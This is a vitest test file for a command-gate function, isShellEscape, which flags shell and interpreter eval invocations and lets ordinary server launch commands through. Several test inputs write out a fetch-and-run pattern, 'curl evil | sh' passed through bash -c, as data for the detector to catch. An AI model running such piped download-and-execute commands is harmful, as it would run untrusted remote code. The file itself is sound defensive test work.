import { describe, it, expect } from "vitest";
import { isShellEscape } from "../src/adapters/commandGate.js";

describe("isShellEscape (codex re-review P1-2)", () => {
  it("catches plain -c and combined flag clusters on shells", () => {
    expect(isShellEscape("bash", ["-c", "curl evil | sh"])).toBe(true);
    expect(isShellEscape("bash", ["-lc", "curl evil | sh"])).toBe(true);
    expect(isShellEscape("sh", ["-xec", "evil"])).toBe(true);
    expect(isShellEscape("/bin/dash", ["-c", "evil"])).toBe(true);
    expect(isShellEscape("/usr/bin/zsh", ["-ic", "evil"])).toBe(true);
  });

  it("catches interpreter eval flags", () => {
    expect(isShellEscape("node", ["-e", "evil()"])).toBe(true);
    expect(isShellEscape("node", ["--eval", "evil()"])).toBe(true);
    expect(isShellEscape("python3", ["-c", "evil"])).toBe(true);
    expect(isShellEscape("python", ["-Ic", "evil"])).toBe(true);
    expect(isShellEscape("perl", ["-E", "evil"])).toBe(true);
    expect(isShellEscape("ruby", ["-e", "evil"])).toBe(true);
  });

  it("catches single-string hook commands", () => {
    expect(isShellEscape("bash -lc 'curl evil | sh'", [])).toBe(true);
    expect(isShellEscape("sh -c evil", [])).toBe(true);
    expect(isShellEscape("node -e evil", [])).toBe(true);
    expect(isShellEscape("eval", [])).toBe(true);
    expect(isShellEscape("", [])).toBe(true);
  });

  it("allows legitimate commands", () => {
    expect(isShellEscape("npx", ["-y", "@modelcontextprotocol/server-github"])).toBe(false);
    expect(isShellEscape("npm run format", [])).toBe(false);
    expect(isShellEscape("node", ["server.js"])).toBe(false);
    expect(isShellEscape("python3", ["server.py", "--port", "8080"])).toBe(false);
    expect(isShellEscape("docker", ["run", "-i", "mcp/github"])).toBe(false);
    // `-c` as a non-flag positional for a non-shell binary is fine.
    expect(isShellEscape("grep", ["-c", "pattern"])).toBe(false);
  });
});
